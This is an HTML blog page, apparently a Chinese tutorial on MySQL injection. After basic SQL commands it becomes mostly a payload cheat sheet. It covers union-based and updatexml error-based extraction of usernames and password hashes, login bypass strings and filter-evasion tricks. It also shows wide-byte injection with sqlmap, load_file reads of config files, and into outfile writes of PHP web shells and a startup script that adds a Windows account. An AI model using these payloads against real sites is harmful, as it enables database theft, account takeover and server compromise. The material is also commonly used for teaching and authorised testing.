@@ -1,0 +1,418 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>mysql注入 | pony686</title>
+<link rel="shortcut icon" href="https://itxz.fun/favicon.ico?v=1599442336675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://itxz.fun/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="mysql注入 | pony686 - Atom Feed" href="https://itxz.fun/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="lamp
+lnmp
+linux apache  mysql php
+linux nginx mysql php
+show databases; 查看系统数据库有那些
+use mysql； 使用mysql数据库
+create database..." />
+    <meta name="keywords" content="Gridea" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://itxz.fun">
+  <img class="avatar" src="https://itxz.fun/images/avatar.png?v=1599442336675" alt="">
+  </a>
+  <h1 class="site-title">
+    pony686
+  </h1>
+  <p class="site-description">
+    pony686
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          python
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://itxz.fun" class="menu" target="_blank">
+          web安全
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              mysql注入
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-09-06
+              </span>
+              <span>
+                12 min read
+              </span>
+              
+                <a href="https://itxz.fun/tag/6ILTCHiNL/" class="post-tag">
+                  # Gridea
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>lamp<br>
+lnmp<br>
+linux apache  mysql php<br>
+linux nginx mysql php</p>
+<p>show databases; 查看系统数据库有那些<br>
+use mysql； 使用mysql数据库<br>
+create database xy ；创建xy数据库<br>
+drop database xy 删除数据库</p>
+<p>use xy ；<br>
+show table admin （id，int，username char（50，password char（50））；创建一个admin表，增加三个列名 id username password<br>
+select * from admin ；查询admin 表里的所有内容<br>
+select * from admin where id=1 ；指定条件查找，查询adnmin表的usernae，password 两列数据</p>
+<p>insert into admin （id，username，password ）values （1，‘admin’，‘admmin888‘）；<br>
+插入一行数据<br>
+insert into admin （id，username，password）value（1，‘admin'，’admin888），（2，‘cracer'，’admin888）同时插入两行数据<br>
+insert into admin （id，username，password ）values （1，‘admin’，md5（‘admmin888）‘）；<br>
+update admin set password ='123123' where id =1 将这行password 改成 123123<br>
+delete from admin where id =1<br>
+drop table  admin; 删除admin 表</p>
+<p>常见的sql语句<br>
+1、说明：创建数据库<br>
+CREATE DATABASE database-name<br>
+2、说明：删除数据库<br>
+drop database dbname<br>
+3、说明：创建新表<br>
+CREATE TABLE MYTABLE (name VARCHAR(20), sex CHAR(1));<br>
+4、查看数据库<br>
+show databases;<br>
+插入数据<br>
+insert into admin(username,password) value ('admin','admin');<br>
+查询数据<br>
+select * from admin;<br>
+更新修改数据<br>
+update admin set password='adsdf' where id = 1;<br>
+删除数据<br>
+delete from admin where id =1 ;</p>
+<p>Mysql 函数<br>
+1:system_user() 系统用户名<br>
+2:user()        用户名<br>
+3:current_user  当前用户名<br>
+4:session_user()连接数据库的用户名<br>
+5:database()    数据库名<br>
+6:version()     MYSQL数据库版本<br>
+7:load_file()  	转成16进制或者是10进制 MYSQL读取本地文件的函数<br>
+8:@@datadir     读取数据库路径<br>
+9:@@basedir    MYSQL 安装路径<br>
+10:@@version_compile_os   操作系统</p>
+<p>相关函数<br>
+mid()---从文本字段中提取字符<br>
+SELECT MID(column_name,start[,length]) FROM table_name;<br>
+column_name	必需。要提取字符的字段。<br>
+start	必需。规定开始位置（起始值是 1）。<br>
+length	可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</p>
+<p>limit()---返回前几条或者中间某几行数据<br>
+select * from table limit m,n;<br>
+其m指记录始index0始表示第条记录 n指第m+1条始取n条<br>
+select * from user limit 1,2;<br>
+Count()---聚集函数，统计元祖的个数</p>
+<p>rand()---用于产生一个0~1的随机数<br>
+floor()---向下取整</p>
+<p>group by---依据我们想要的规则对结果进行分组<br>
+select * from user group by host;<br>
+length()---返回字符串的长度<br>
+select length('www.cracer.com');<br>
+Substr()---截取字符串 三个参数 （所要截取字符串，截取的位置，截取的长度）<br>
+select substr(host,2,3) from user;<br>
+Ascii()---返回字符串的ascii码<br>
+Select ascii(‘a’);</p>
+<p>注释符：<br>
+#、--、/<strong>/<br>
+内联注释：<br>
+/<em>！union</em>/和/<em>!50001union</em>/<br>
+语句中的代替符号：<br>
+用+、%0a/%0D/和/<em>ADJFKLASDF--234U23SJFD AND 1=1</em>/代替空格<br>
+用%或者/</strong>/、%00、%01分割sql语句<br>
+编码绕过 url编码</p>
+<p>select user（）；查看链接用户<br>
+select version（）；查看数据库版本<br>
+select database （）；查看当前使用的数据库<br>
+select @@ basedir； 查看数据库安装路径<br>
+d:/phpstudy/mysql<br>
+d:phpstudy/apache/conf/httpd.conf<br>
+select @@ datadir;  数据库路径</p>
+<p>select load _file (d:/q.txt');  读文件内容 dnslog<br>
+select &quot;<?php phpinfo();?>&quot; into outfile 'd:/1.php';  导shell 文件<br>
+写文件需要满足的条件<br>
+1.root权限<br>
+2.关闭魔术引导<br>
+3，找到根目录<br>
+4，windows可以<br>
+5.-secure --file -priv 设置null  设置允许导入路径</p>
+<p>sqlmap -u “”--D xycms --- tables --- count<br>
+单行注释可以用：</p>
+<p>#---<br>
+%23<br>
+/<em>asldfa</em>/ 多行注入<br>
+/<em>!select version()</em>/ 内联注入<br>
+/<em>select <em>/versioin();<br>
+/</em>!10000select</em>/version(); 可以执行<br>
+/*5555 select */version（）；</p>
+<ul>
+<li>% 0a   %0d /<em>sdfsaf</em>/ 代替空格<br>
+url 编码绕过通用防护代码<br>
+union select</li>
+</ul>
+<p>mysql注入类型<br>
+1。boole 盲注<br>
+2.时间盲注<br>
+3.union联合<br>
+4.显错注入</p>
+<p>mysql注入原理<br>
+1.判断注入漏洞<br>
+And 1=1 and1=2<br>
+2.判断多少列，数字报错减少，正常增加<br>
+Order by 20<br>
+3.union联合查询，报字符列在第几列<br>
+union select 1,2,3,4,5<br>
+4.在字符列上报相关信息,数据库版本信息，用户，数据库名称（十六进制转换）。<br>
+union select 1,version(),3,4,5<br>
+5.指定数据库，爆数据库表名<br>
+union select 1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 from information_schema.tables where table_schema=0x6D7574696130313231<br>
+6.指定表名爆列名<br>
+union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 from information_schema.columns where table_name=0x61646D696E<br>
+id,name,adminpass,right_li,right_li_b,checks,level_id<br>
+7.查询数据信息<br>
+union select 1,group_concat(name,0x5c,adminpass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 from  admin</p>
+<p>常见的防注入代码<br>
+function check_sql($x){<br>
+$inject=array(&quot;select&quot;,&quot;union&quot;,&quot;from&quot;,&quot;and&quot;,&quot;or&quot;);</p>
+<pre><code>$i=str_replace($inject,&quot;&quot;,$x);
+return $i;
+</code></pre>
+<p>}</p>
+<p>/* function check_sql($Sql_Str) {//自动过滤Sql的注入语句。<br>
+<span class='katex-error' title='ParseError: KaTeX parse error: Can&#039;t use function &#039;\&#039;&#039; in math mode at position 48: …|update|delete|\̲&#039;̲|\\*|\*|\.\.\/|…'>check=preg_match(&#039;/select|insert|update|delete|\&#039;|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i&#039;,</span>Sql_Str);<br>
+if ($check) {<br>
+echo '<script language="JavaScript">alert(&quot;系统警告：\n\n请不要尝试在参数中包含非法字符尝试注入！&quot;);</script>';<br>
+exit();<br>
+}else{<br>
+return $Sql_Str;<br>
+}<br>
+} */</p>
+<p>绕过防注入代码<br>
+大小写绕过<br>
+%00编码绕过</p>
+<p>显错注入<br>
+判断是否存在注入输入'</p>
+<p>显错注入有很多函数</p>
+<p>floor()、extractvalue()、updatexml()、geometrycollection()、multipoint()、<br>
+polygon()、multipolygon()、linestring()、multilinestring()、exp()<br>
+常用的前三种比较多<br>
+我们今天讲些<br>
+updatexml的显错利用</p>
+<p>'and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+                                                                                                     #查看当前数据库用户<br>
+'and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+                                                                                              #查看当前数据库名<br>
+'and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+                    #查看当前数据库<br>
+'and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1)--+                    #查看当前数据库<br>
+'and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1),0x7e),1)--+                    #查看当前数据库<br>
+'and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)--+         #查看所有数据库<br>
+'and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='mysql'),0x7e),1)--+<br>
+可以看出，以~开头的内容不是xml格式的语法，报错，但是会显示无法识别的内容是什么，这样就达到了目的。<br>
+有一点需要注意，updatexml()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位<br>
+这里查询前5位示意:<br>
+'and updatexml(1,concat(0x7e,substring(hex((select database())),1,5),0x7e),1)<br>
+'and updatexml(1,concat(0x7e,substring(hex((select group_concat(schema_name) from information_schema.schemata)),1,5),0x7e),1)--+</p>
+<p>'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='mysql' limit 0,1),0x7e),1)--+                                  #查看当前数据库的表名<br>
+'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='user' limit 0,1),0x7e),1)--+                              #查看user表的列名<br>
+'and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='user' limit 0,1),0x7e),1)--+<br>
+列用户名密码<br>
+'and updatexml(1,concat(0x7e,(select user from user limit 0,1),0x7e),1)--+<br>
+'and updatexml(1,concat(0x7e,(select password from user limit 0,1),0x7e),1)--+</p>
+<p>%27and%20updatexml(1,concat(0x7e,substring(hex((select%20password%20from%20user%20limit%200,1)),44,75),0x7e),1)--+</p>
+<p>后台绕过<br>
+select * from user where username='' and password=''<br>
+输入：admin'#<br>
+select * from user where username='admin'#' and password=''<br>
+输入：admin' or '1=1<br>
+select * from user where username='admin' or '1=1' and password=''</p>
+<p>Mysql长字节截断攻击<br>
+条件：<br>
+管理员和普通用户在一个表中<br>
+用户名字段长度有一定限制比如长度为10个字符<br>
+普通用户在注册名称的时候可以吧用户名设置为<br>
+Admin+++++++++++++++++++++++++<br>
+使其长度超过字段限制的长度，会自动截断，变成admin<br>
+这样相当于增加了个admin管理员账号密码。</p>
+<p>Mysql宽字节注入<br>
+本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。<br>
+当打开时，所有的 '（单引号），&quot;（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。<br>
+这和 addslashes() 作用完全相同。<br>
+一共有三个魔术引号指令：<br>
+magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。<br>
+不能在运行时改变。在 PHP 中默认值为 on。 参见 get_magic_quotes_gpc()。<br>
+magic_quotes_runtime 如果打开的话，大部份从外部来源取得数据并返回的函数，<br>
+包括从数据库和文本文件，所返回的数据都会被反斜线转义。<br>
+该选项可在运行的时改变，在 PHP 中的默认值为 off。<br>
+参见 set_magic_quotes_runtime() 和 get_magic_quotes_runtime()。<br>
+magic_quotes_sybase 如果打开的话，将会使用单引号对单引号进行转义而非反斜线。<br>
+此选项会完全覆盖 magic_quotes_gpc。<br>
+如果同时打开两个选项的话，单引号将会被转义成 ''。而双引号、反斜线 和 NULL 字符将不会进行转义。<br>
+如何取得其值参见 ini_get()。</p>
+<p>程序本身开启魔术指导<br>
+php 5.2.17 版本 默认开启魔术引导</p>
+<p>2个字节<br>
+4个字节<br>
+%bf’<br>
+可以百分百过掉<br>
+gbk编码 windows可以<br>
+utf-8 linux 废掉了</p>
+<p>宽字节注入<br>
+使用宽字节注入绕过魔术引号<br>
+%df%27<br>
+sqlmap.py -u “cracer.com/xx.php?id=1”<br>
+--risk 3 --dbms=mysql -p username --tamper unmagicquotes.py -v 3</p>
+<p>PART 4:  Mysql  读写文件操作</p>
+<p>Mysql注入读写文件<br>
+load_file()函数<br>
+该函数是用来读取源文件的函数<br>
+只能读取绝对路径的网页文件<br>
+在使用load_file()时应先找到网站绝对路径<br>
+例如：<br>
+d:/www/xx/index.php<br>
+/usr/src/apache/htdoc/index.php<br>
+注意：<br>
+1.路径符号 &quot;&quot; 错误“\”正确 “/” 正确<br>
+2.转换十六进制数，就不要‘’</p>
+<p>获取根目录</p>
+<p>1.报错显示<br>
+2.谷歌黑客	<br>
+site:目标网站 warning<br>
+3.遗留文件 phpinfo info test php<br>
+4.漏洞爆路径<br>
+5.读取配置文件</p>
+<p>读取网站文件内容<br>
+and 1=2 union select 1,load_file('C:\Inetpub\wwwroot\mysql-sql\inc\set_sql.php'),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18<br>
+and 1=2 union select 1,load_file(0x443A5C7068705C41504D53657276352E322E365C7777775C6874646F63735C335C636F6E6669672E706870),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</p>
+<p>c:/windows/system32/inetsrv/metabase.xml</p>
+<p>写入函数 into outfile<br>
+and 1=2 union select 1,&quot;<?php @eval($_POST['cracer']);?>&quot;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile 'C:/Inetpub/wwwroot/mysql-sql/cracer.txt'</p>
+<p>其他利用<br>
+第一种方法：需要使用wamp环境搭建需要系统权限才能执行</p>
+<p>and 1=2 union select 1,&quot;net user seven 123 /add&quot;,2,3,4,5,6 into outfile 'C://Documents and Settings/Administrator/「开始」菜单/程序/启动/1.bat'</p>
+<p>第二种方法：</p>
+<p>and 1=2 union select 1,&quot;<pre><body><?  @system($_GET['cc']); ?></body></pre>&quot;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile 'C:/Inetpub/wwwroot/mysql-sql/cr.php'</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://itxz.fun/post/sql-zhu-ru-ba-chang-shi-zhan/">
+              <h3 class="post-title">
+                sql注入靶场实战
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://itxz.fun/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
